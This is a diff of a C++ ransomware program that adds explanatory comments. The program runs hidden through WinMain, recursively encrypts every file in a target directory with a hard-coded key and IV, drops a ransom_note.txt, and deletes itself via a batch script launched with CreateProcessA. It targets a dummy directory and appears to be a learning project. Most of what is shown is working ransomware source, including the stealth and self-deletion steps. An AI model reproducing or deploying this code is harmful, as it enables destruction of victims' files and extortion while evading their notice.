@@ -13,15 +13,18 @@ void encryptFile(unsigned char key_chars[], unsigned char iv[], const char* file
 void leaveNote(std::string target_dir, const char* message);
 void deleteSelf();
 
+// basically the same thing as basic_ransomware.cpp, except this time the ransomware deletes itself after it finishes
+// we use this int CALLBACK WinMain() instead of int main() so that the program automatically runs in the background without showing the user anything
 int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
 
-    std::string target_dir = "dummy_directory_1";
+    std::string target_dir = "dummy_directory_1";   // this is the target directory for the ransomware
     std::filesystem::path myPath = target_dir;
     std::string file;
 
-    unsigned char key_chars[] = "Hard-coded key here.";
-    unsigned char iv[] = "some random IV value";
+    unsigned char key_chars[] = "Hard-coded key here.";     // ransomware's encryption key
+    unsigned char iv[] = "some random IV value";             // ransomware's initialization value
 
+    // loop that recursively visits every single file in the target directory and encrypts them
     for (const auto& dirEntry : recursive_directory_iterator(myPath)){
 
         if (!dirEntry.is_directory()){
@@ -40,6 +43,8 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     return 0;
 }
 
+// funcion that encrypts a file given an encryption key and IV
+// for more granular comments on this, check encrypt_file2.cpp in the encryption tests folder
 void encryptFile(unsigned char key_chars[], unsigned char iv[], const char* filename){
     int bytes_read;
     int bytes_written;
@@ -66,6 +71,7 @@ void encryptFile(unsigned char key_chars[], unsigned char iv[], const char* file
     fclose(file_ptr);
 }
 
+// function to leave the ransom note
 void leaveNote(std::string target_dir, const char* message){
     std::string ransom_note_file = target_dir + "/ransom_note.txt";
     FILE* notePtr = fopen(ransom_note_file.c_str(), "w");
@@ -73,6 +79,8 @@ void leaveNote(std::string target_dir, const char* message){
     fclose(notePtr);
 }
 
+// this function creates a batch script to delete the ransomware after it finishes
+// once all the files are encrypted, this function will start a new process and run the deletion script there
 void deleteSelf(){
     
     char exePath[MAX_PATH];
@@ -86,7 +94,7 @@ void deleteSelf(){
     batchFile << "del \"%~f0\"\n";       
     batchFile.close();
 
-    // some very bizarre code that I don't even understand yet
+    // some very bizarre code that I don't even understand yet, just got it online
     STARTUPINFOA si = { sizeof(si) };
     PROCESS_INFORMATION pi;
     CreateProcessA(NULL, const_cast<char*>(batchFileName.c_str()), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
